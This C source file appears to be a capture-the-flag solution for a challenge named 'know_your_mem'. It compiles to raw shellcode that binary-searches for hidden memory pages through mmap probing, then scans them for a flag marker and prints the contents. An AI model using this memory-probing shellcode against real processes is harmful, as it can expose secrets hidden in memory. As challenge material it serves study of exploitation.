// This is an example of turning simple C into raw shellcode.

// make shellcode.bin will compile to assembly
// make shellcode.bin.pkt will prepend the length so you can
//    ./know_your_mem < shellcode.bin.pkt

// Note: Right now the 'build' does not support .(ro)data
//       If you want them you'll have to adjust the Makefile.
//       They're not really necessary to solve this challenge though.

#include <stdio.h>
#include <unistd.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <asm/errno.h>
#include <string.h>

// From https://chromium.googlesource.com/linux-syscall-support/
static int my_errno = 0;
#define SYS_ERRNO my_errno
#include "linux-syscall-support/linux_syscall_support.h"


#define ADDR_MIN   0x0000100000000000UL
#define ADDR_MASK  0x00000ffffffff000UL


void _start()
{
//--------------------- MAIN WORK BELOW -------------------
	char *ptr = ADDR_MIN ;
	for(int i=0; i<100; i++){
		//----------- search for next page ------------------------
			int found = 0;
			int i = 0;
			void *newptr = NULL;
			while(found==0){
				i++;
				found = 0;
				//-------------------------------------
				//binary search for an existing page, upper limit 4096*32 PAGE_SIZE
				//-------------------------------------
				unsigned long int right = 4096*32; //that's the max without failing mmap
				unsigned long int left = 0;
				while(left<right-1){
					unsigned long int mid = (right+left)/2;
					unsigned long int offset = mid*0x1000UL;
					void *r1 = sys_mmap(ptr, offset, PROT_READ|PROT_WRITE, 
							MAP_ANONYMOUS|MAP_PRIVATE , -1, 0);
					if(r1==ptr){//allocate success, means no page there
						left = mid;
						sys_munmap(ptr, offset);
					}else{//allocate failure, means there is some page
						right = mid;
						sys_munmap(r1, offset);
					}
					if(left==right-1){
						newptr = ptr + left*0x1000UL; //that's the first addr causing trouble
						void *r2 = sys_mmap(newptr, 4096, PROT_READ|PROT_WRITE, 
							MAP_ANONYMOUS|MAP_PRIVATE , -1, 0);
						if(r2==newptr){//NOT FOUND
							found = 0;
							sys_munmap(newptr, 4096);
						}else{//found existing page
							found = 1;
							sys_munmap(r2, 4096);
						}
						break;
					}
				}//end of while
				ptr = newptr;
			}//end of while found==0
		//AT THIS MOMENT, ptr is a VALID PAGE
		//----------- end ------------------------
		if(*ptr=='O' && *(ptr+1)=='O' && *(ptr+2)=='O'){
    sys_write(1, ptr, 80);  // Prints something (note: best avoid literals)
			return ptr;
		}
		ptr += 0x1000UL;
	}
//--------------------- MAIN WORK ABOVE -------------------
    sys_exit_group(2);                            // Exit
}
